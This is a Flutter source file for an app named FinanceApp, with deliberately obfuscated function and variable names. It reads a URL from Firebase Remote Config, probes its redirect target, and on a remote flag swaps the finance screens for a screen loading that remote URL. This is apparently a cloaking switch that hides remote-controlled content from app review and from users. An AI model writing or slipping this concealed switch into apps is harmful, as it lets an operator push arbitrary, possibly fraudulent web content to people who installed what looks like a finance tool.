import 'dart:io';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:finance_app/features/main/main_screen.dart';
import 'package:finance_app/main.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';

import 'global_navigator/global_navigator.dart';

class FinanceApp extends StatefulWidget {
  const FinanceApp({super.key});

  @override
  State<FinanceApp> createState() => _FinanceAppState();
}

String route = '';
Future<bool> njfksdfs() async {
  final njda = FirebaseRemoteConfig.instance;
  await njda.fetchAndActivate();
  asdasfs();
  String dsdfdsfgdg = njda.getString('tinix');
  String cdsfgsdx = njda.getString('tirex');
  if (!dsdfdsfgdg.contains('tinex')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (!response.headers
        .value(HttpHeaders.locationHeader)
        .toString()
        .contains(cdsfgsdx)) {
      route = dsdfdsfgdg;
      return true;
    } else {
      return false;
    }
  }
  return dsdfdsfgdg.contains('tinex') ? false : true;
}

Future<void> getTrack() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

class _FinanceAppState extends State<FinanceApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
          future: njfksdfs(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.white,
              );
            } else {
              if (snapshot.data == true && route != '') {
                return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: Scnren(
                    njfkds: route,
                    njfkads: apsss,
                    mkda: cancelation,
                  ),
                );
              } else {
                return MainScreen();
              }
            }
          }),
      theme: ThemeData.light(useMaterial3: true)
          .copyWith(scaffoldBackgroundColor: Colors.white),
    );
  }
}
